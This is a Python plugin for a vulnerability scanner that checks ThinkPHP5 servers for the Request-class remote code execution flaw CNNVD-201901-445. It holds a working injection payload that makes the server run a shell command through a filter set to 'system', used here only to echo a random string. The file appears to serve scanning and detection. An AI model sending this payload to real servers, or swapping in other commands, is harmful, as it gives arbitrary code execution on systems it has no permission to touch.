#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
ThinkPHP5 核心类Request远程代码执行
    CNNVD-201901-445
        Payload: https://bbs.zkaq.cn/t/5636.html

ThinkPHP5 核心类Request远程代码执行
'''

from lib.tool.md5 import random_md5
from lib.tool import check
from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {
                'path': 'index.php?s=captcha',
                'data': '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={RCECOMMAND}'
            }
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')

        vul_info = {
            'app_name': 'ThinkPHP',
            'vul_type': 'RCE',
            'vul_id': 'CNNVD-201901-445',
        }

        for payload in self.payloads:
            randomStr = random_md5(6)
            RCEcommand = 'echo ' + randomStr
            
            path = payload['path']
            data = payload['data'].format(RCECOMMAND=RCEcommand)

            res = client.request(
                'post',
                path,
                data=data,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (check.check_res(res.text, randomStr)):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)


def cnnvd_201901_445_scan(clients):
    ''' '''
